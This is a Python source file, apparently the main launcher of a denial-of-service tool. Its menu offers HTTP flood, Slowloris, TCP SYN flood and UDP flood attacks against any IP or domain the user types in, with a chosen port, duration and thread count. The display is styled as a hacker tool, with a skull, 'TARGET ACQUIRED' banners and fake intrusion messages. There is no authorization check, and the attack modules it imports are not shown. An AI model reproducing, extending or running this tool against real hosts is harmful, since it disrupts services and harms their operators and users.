import sys
import os
import time
import threading
import random
import re
import shutil
from colorama import init, Fore, Style

init(autoreset=True)

from config import MAX_DURATION_SECONDS, MAX_THREADS, ATTACK_TYPES
from attacks.http_flood import HTTPFlood
from attacks.slowloris import Slowloris
from attacks.tcp_syn import TCPSYNFlood
from attacks.udp_flood import UDPFlood

BANNER_LINES = [
    " ██████╗  ██████╗ ███████╗    ████████╗ ██████╗  ██████╗ ██╗",
    " ██╔══██╗██╔═══██╗██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║",
    " ██║  ██║██║   ██║███████╗       ██║   ██║   ██║██║   ██║██║",
    " ██║  ██║██║   ██║╚════██║       ██║   ██║   ██║██║   ██║██║",
    " ██████╔╝╚██████╔╝███████║       ██║   ╚██████╔╝╚██████╔╝███████╗",
    " ╚═════╝  ╚═════╝ ╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝",
]

BOX_LINES = [
    "╔════════════════════════════════════════════════════╗",
    "║           Denial of Service Tool                  ║",
    "╚════════════════════════════════════════════════════╝",
]

SKULL = [
    "     ██████████",
    "   ██          ██",
    " ██    ██  ██    ██",
    " ██    ██  ██    ██",
    " ██              ██",
    "   ██  ██████  ██",
    "     ██████████",
    "     ██ ██ ██ ██",
    "     ██████████",
]

HACKER_MESSAGES = [
    "Bypassing firewall...",
    "Injecting packets...",
    "Spoofing headers...",
    "Rotating user agents...",
    "Flooding connection pool...",
    "Saturating bandwidth...",
    "Overloading buffers...",
    "Fragmenting packets...",
    "Exhausting resources...",
    "Amplifying traffic...",
    "Cycling attack vectors...",
    "Escalating payload size...",
]

MATRIX_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()!~"

CONTENT_WIDTH = 66

def get_width():
    return shutil.get_terminal_size().columns

def pad():
    """Returns left padding to center a block of CONTENT_WIDTH in the terminal"""
    w = get_width()
    spaces = max(0, (w - CONTENT_WIDTH) // 2)
    return " " * spaces

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def typewrite(text, color=Fore.WHITE, delay=0.01):
    p = pad()
    sys.stdout.write(p)
    for char in text:
        sys.stdout.write(f"{color}{char}{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(delay)
    print()

def loading_bar():
    bar_width = 40
    print()
    p = pad()
    for i in range(bar_width + 1):
        filled = "█" * i
        empty = "░" * (bar_width - i)
        percent = int((i / bar_width) * 100)
        sys.stdout.write(f"\r{p}{Fore.RED}[{filled}{empty}] {Fore.WHITE}{percent}%{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(0.03)
    print()

def glitch_text(text, color=Fore.RED, glitch_rounds=3):
    glitch_chars = "!@#$%^&*()_+-=[]{}|;:',.<>?/~`"
    p = pad()
    for _ in range(glitch_rounds):
        glitched = ""
        for char in text:
            if char != " " and random.random() > 0.5:
                glitched += random.choice(glitch_chars)
            else:
                glitched += char
        sys.stdout.write(f"\r{p}{color}{glitched}{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(0.08)
    sys.stdout.write(f"\r{p}{color}{text}{Style.RESET_ALL}")
    sys.stdout.flush()
    print()

def matrix_rain(duration=2.5):
    w = get_width()
    columns = [0] * w
    end_time = time.time() + duration
    clear()

    while time.time() < end_time:
        line = ""
        for i in range(w):
            if random.random() > 0.85:
                columns[i] = 1
            if columns[i]:
                if random.random() > 0.7:
                    line += f"{Fore.GREEN}{random.choice(MATRIX_CHARS)}"
                elif random.random() > 0.5:
                    line += f"{Fore.LIGHTGREEN_EX}{random.choice(MATRIX_CHARS)}"
                else:
                    line += f"{Fore.LIGHTBLACK_EX}{random.choice(MATRIX_CHARS)}"
                if random.random() > 0.8:
                    columns[i] = 0
            else:
                line += " "
        print(f"{line}{Style.RESET_ALL}")
        time.sleep(0.04)

    clear()

def color_cycle_text(text, cycles=3):
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.MAGENTA, Fore.RED]
    p = pad()
    visible_len = len(text)
    inner_pad = max(0, (CONTENT_WIDTH - visible_len) // 2)
    full_pad = p + " " * inner_pad
    for cycle in range(cycles):
        for color in colors:
            sys.stdout.write(f"\r{full_pad}{color}{text}{Style.RESET_ALL}")
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write(f"\r{full_pad}{Fore.RED}{text}{Style.RESET_ALL}")
    sys.stdout.flush()
    print()

def target_acquired(target):
    print()
    p = pad()
    width = len(target) + 12
    border = "═" * (width - 2)

    typewrite("Locking target...", Fore.LIGHTBLACK_EX, 0.03)
    time.sleep(0.3)

    for i in range(3):
        scan_text = f"Scanning{'.' * (i + 1)}{' ' * (3 - i)}"
        sys.stdout.write(f"\r{p}{Fore.YELLOW}{scan_text}{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(0.4)
    print()

    time.sleep(0.2)
    print(f"{p}{Fore.RED}╔{border}╗{Style.RESET_ALL}")
    time.sleep(0.1)
    print(f"{p}{Fore.RED}║{Fore.WHITE}  >>> {Fore.YELLOW}{target}{Fore.WHITE} <<<  {Fore.RED}║{Style.RESET_ALL}")
    time.sleep(0.1)
    print(f"{p}{Fore.RED}╚{border}╝{Style.RESET_ALL}")
    time.sleep(0.2)

    color_cycle_text("████ TARGET ACQUIRED ████")
    print()

def countdown():
    print()
    p = pad()
    nums = [
        ("██████╗ ", "╚════██╗", " █████╔╝", " ╚═══██╗", " █████╔╝", " ╚════╝ "),
        ("██████╗ ", "╚═══██║", "  ███╔═╝", " ██╔══╝ ", " ██████╗", " ╚═════╝"),
        ("  ██╗   ", " ███║   ", " ╚██║   ", "  ██║   ", "  ██║   ", "  ╚═╝   "),
    ]

    for num in nums:
        clear_lines = len(num)
        inner_pad = " " * ((CONTENT_WIDTH - 10) // 2)
        for line in num:
            print(f"{p}{inner_pad}{Fore.RED}{line}{Style.RESET_ALL}")
        time.sleep(0.7)
        for _ in range(clear_lines):
            sys.stdout.write("\033[A\033[K")
        sys.stdout.flush()

    attack_text = [
        " █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗██╗",
        "██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██║",
        "███████║   ██║      ██║   ███████║██║     █████╔╝ ██║",
        "██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚═╝",
        "██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗██╗",
        "╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝",
    ]
    for line in attack_text:
        print(f"{p}{Fore.RED}{line}{Style.RESET_ALL}")
    time.sleep(1)

    for _ in range(len(attack_text)):
        sys.stdout.write("\033[A\033[K")
    sys.stdout.flush()

def show_skull():
    print()
    p = pad()
    inner_pad = " " * ((CONTENT_WIDTH - 22) // 2)
    for line in SKULL:
        print(f"{p}{inner_pad}{Fore.RED}{line}{Style.RESET_ALL}")
        time.sleep(0.08)
    print()

def hacker_message_callback(message, stop_event):
    while not stop_event.is_set():
        time.sleep(random.uniform(3, 7))
        if not stop_event.is_set():
            msg = random.choice(HACKER_MESSAGES)
            timestamp = time.strftime("%H:%M:%S")
            p = pad()
            print(f"{p}{Fore.WHITE}[{Fore.GREEN}{timestamp}{Fore.WHITE}] {Fore.MAGENTA}{msg}{Style.RESET_ALL}")

def animate_banner():
    matrix_rain(2.5)
    clear()
    print()

    for line in BANNER_LINES:
        glitch_text(line, Fore.RED, glitch_rounds=3)
        time.sleep(0.05)

    print()

    typewrite("Initializing systems...", Fore.LIGHTBLACK_EX, 0.02)
    loading_bar()

    print()

    for line in BOX_LINES:
        typewrite(line, Fore.YELLOW, 0.008)

    print()
    time.sleep(0.3)

    status_msgs = [
        ("[+] Modules loaded", Fore.GREEN),
        ("[+] Attack vectors ready", Fore.GREEN),
        ("[+] System online", Fore.GREEN),
    ]
    for msg, color in status_msgs:
        typewrite(msg, color, 0.02)
        time.sleep(0.2)

    print()
    time.sleep(0.5)

def log(message, color=Fore.CYAN):
    timestamp = time.strftime("%H:%M:%S")
    p = pad()
    print(f"{p}{Fore.WHITE}[{Fore.GREEN}{timestamp}{Fore.WHITE}] {color}{message}{Style.RESET_ALL}")

def print_menu():
    p = pad()
    print()
    print(f"{p}{Fore.RED}[{Fore.WHITE}1{Fore.RED}]{Fore.CYAN} HTTP Flood       {Fore.WHITE}- {Fore.LIGHTBLACK_EX}High volume HTTP requests{Style.RESET_ALL}")
    print(f"{p}{Fore.RED}[{Fore.WHITE}2{Fore.RED}]{Fore.CYAN} Slowloris        {Fore.WHITE}- {Fore.LIGHTBLACK_EX}Slow HTTP connections{Style.RESET_ALL}")
    print(f"{p}{Fore.RED}[{Fore.WHITE}3{Fore.RED}]{Fore.CYAN} TCP SYN Flood    {Fore.WHITE}- {Fore.LIGHTBLACK_EX}Raw socket SYN packets{Style.RESET_ALL}")
    print(f"{p}{Fore.RED}[{Fore.WHITE}4{Fore.RED}]{Fore.CYAN} UDP Flood        {Fore.WHITE}- {Fore.LIGHTBLACK_EX}UDP packet saturation{Style.RESET_ALL}")
    print(f"{p}{Fore.RED}[{Fore.WHITE}5{Fore.RED}]{Fore.CYAN} Exit{Style.RESET_ALL}")
    print()

def get_input(prompt, default=None):
    suffix = f" {Fore.LIGHTBLACK_EX}[{default}]" if default else ""
    p = pad()
    val = input(f"{p}{Fore.RED}>{Fore.WHITE} {prompt}{suffix}: {Fore.GREEN}").strip()
    print(Style.RESET_ALL, end="")
    return val if val else default

def attack_callback(message):
    if "Requests sent:" in message or "Connections" in message or "Packets" in message:
        log(message, Fore.YELLOW)
    elif "Error" in message or "Failed" in message:
        log(message, Fore.RED)
    elif "completed" in message.lower():
        log(message, Fore.GREEN)
    else:
        log(message, Fore.CYAN)

def run_attack(attack_type, target, port, duration, threads):
    countdown()

    print()
    log("=" * 50, Fore.RED)
    log("ATTACK INITIATED", Fore.RED)
    log(f"Type: {attack_type.upper()}", Fore.YELLOW)
    log(f"Target: {target}:{port}", Fore.YELLOW)
    log(f"Duration: {duration}s | Threads: {threads}", Fore.YELLOW)
    log("=" * 50, Fore.RED)
    print()

    hacker_stop = threading.Event()
    hacker_thread = threading.Thread(target=hacker_message_callback, args=("", hacker_stop))
    hacker_thread.daemon = True
    hacker_thread.start()

    try:
        if attack_type == "http_flood":
            attack = HTTPFlood(target, duration, threads, port, attack_callback)
        elif attack_type == "slowloris":
            attack = Slowloris(target, duration, threads, port, attack_callback)
        elif attack_type == "tcp_syn":
            attack = TCPSYNFlood(target, duration, threads, port, attack_callback)
        elif attack_type == "udp_flood":
            attack = UDPFlood(target, duration, threads, port, callback=attack_callback)

        stats = attack.run()

        hacker_stop.set()
        time.sleep(0.5)

        show_skull()

        log("=" * 50, Fore.GREEN)
        log("ATTACK COMPLETE", Fore.GREEN)
        for key, value in stats.items():
            if key not in ("start_time", "end_time"):
                label = key.replace("_", " ").title()
                log(f"{label}: {value}", Fore.WHITE)
        log("=" * 50, Fore.GREEN)

    except KeyboardInterrupt:
        hacker_stop.set()
        log("Attack stopped by user", Fore.YELLOW)
    except Exception as e:
        hacker_stop.set()
        log(f"Error: {str(e)}", Fore.RED)

def main():
    animate_banner()

    while True:
        print_menu()
        choice = get_input("Select attack type")

        if choice == "5":
            log("Exiting...", Fore.YELLOW)
            sys.exit(0)

        attack_map = {"1": "http_flood", "2": "slowloris", "3": "tcp_syn", "4": "udp_flood"}

        if choice not in attack_map:
            log("Invalid choice", Fore.RED)
            continue

        attack_type = attack_map[choice]

        print()
        target = get_input("Target (IP or domain)")
        if not target:
            log("Target is required", Fore.RED)
            continue

        target_acquired(target)

        port = int(get_input("Port", "80"))
        duration = int(get_input("Duration (seconds)", "30"))
        threads = int(get_input("Threads", "100"))

        if duration > MAX_DURATION_SECONDS:
            log(f"Duration exceeds max of {MAX_DURATION_SECONDS}s", Fore.RED)
            continue

        if threads > MAX_THREADS:
            log(f"Threads exceed max of {MAX_THREADS}", Fore.RED)
            continue

        run_attack(attack_type, target, port, duration, threads)

        print()
        again = get_input("Run another attack? (y/n)", "y")
        if again.lower() != "y":
            log("Exiting...", Fore.YELLOW)
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n  {Fore.YELLOW}Exiting...{Style.RESET_ALL}")
        sys.exit(0)
